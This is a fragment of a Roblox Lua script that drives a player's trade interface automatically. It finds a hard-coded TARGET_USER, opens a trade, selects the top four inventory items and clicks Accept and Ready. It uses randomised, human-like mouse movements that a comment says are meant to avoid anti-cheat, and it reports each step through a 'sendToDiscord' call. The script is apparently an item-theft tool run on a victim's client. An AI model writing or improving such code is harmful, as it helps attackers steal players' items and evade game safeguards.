-- ============================================
-- HUMAN-LIKE CLICK SIMULATION
-- ============================================

local function humanClick(guiObject)
    if not guiObject then return false end
    
    pcall(function()
        -- Random human-like delay (0.1-0.3s)
        local delay = math.random(10, 30) / 100
        wait(delay)
        
        -- Get button position
        local pos = guiObject.AbsolutePosition
        local size = guiObject.AbsoluteSize
        
        if pos and size then
            -- Random offset within button (humans don't click exact center)
            local xOffset = math.random(-5, 5)
            local yOffset = math.random(-5, 5)
            local clickX = pos.X + (size.X / 2) + xOffset
            local clickY = pos.Y + (size.Y / 2) + yOffset
            
            -- Simulate mouse movement to button (human-like)
            VirtualInput:SendMouseMoveEvent(clickX - 50, clickY - 50, 0)
            wait(0.05)
            VirtualInput:SendMouseMoveEvent(clickX - 20, clickY - 20, 0)
            wait(0.03)
            VirtualInput:SendMouseMoveEvent(clickX, clickY, 0)
            wait(math.random(5, 15) / 100)
            
            -- Mouse down
            VirtualInput:SendMouseButtonEvent(clickX, clickY, 0, true, game, 0)
            wait(math.random(5, 15) / 100)
            
            -- Mouse up
            VirtualInput:SendMouseButtonEvent(clickX, clickY, 0, false, game, 0)
        end
        
        -- Fire button events
        guiObject:Fire("MouseButton1Click")
        guiObject:Fire("Activated")
    end)
    
    return true
end

-- ============================================
-- FIND UI ELEMENTS (Without triggering anti-cheat)
-- ============================================

local function findPlayerInList()
    for _, frame in pairs(player.PlayerGui:GetDescendants()) do
        if frame:IsA("TextLabel") and frame.Text == TARGET_USER then
            local clickable = frame.Parent
            if clickable and (clickable:IsA("TextButton") or clickable:IsA("ImageButton")) then
                return clickable
            end
        end
    end
    return nil
end

local function findTradeButton()
    for _, btn in pairs(player.PlayerGui:GetDescendants()) do
        if btn:IsA("TextButton") then
            local text = (btn.Text or ""):lower()
            if text:find("trade") and not text:find("request") then
                return btn
            end
        end
    end
    return nil
end

local function findAcceptButton()
    for _, btn in pairs(player.PlayerGui:GetDescendants()) do
        if btn:IsA("TextButton") and btn.Text == "Accept" then
            return btn
        end
    end
    return nil
end

local function findReadyButton()
    for _, btn in pairs(player.PlayerGui:GetDescendants()) do
        if btn:IsA("TextButton") and (btn.Text == "Ready" or (btn.Text or ""):lower():find("ready")) then
            return btn
        end
    end
    return nil
end

local function findItemButtons()
    local items = {}
    for _, btn in pairs(player.PlayerGui:GetDescendants()) do
        if btn:IsA("ImageButton") and btn.Parent and btn.Parent.Name == "Inventory" then
            table.insert(items, btn)
        end
    end
    return items
end

-- ============================================
-- HUMAN-LIKE ITEM SELECTION
-- ============================================

local function selectItemsHumanLike()
    local items = findItemButtons()
    local selected = {}
    
    -- Randomize which items to select (top 4 by position)
    for i = 1, math.min(4, #items) do
        local item = items[i]
        if item then
            table.insert(selected, item)
        end
    end
    
    -- Add items with human-like delays
    for i, item in pairs(selected) do
        sendToDiscord("Clicking item " .. i .. " of " .. #selected)
        humanClick(item)
        wait(math.random(20, 50) / 100) -- 0.2-0.5s between items
    end
    
    return #selected
end

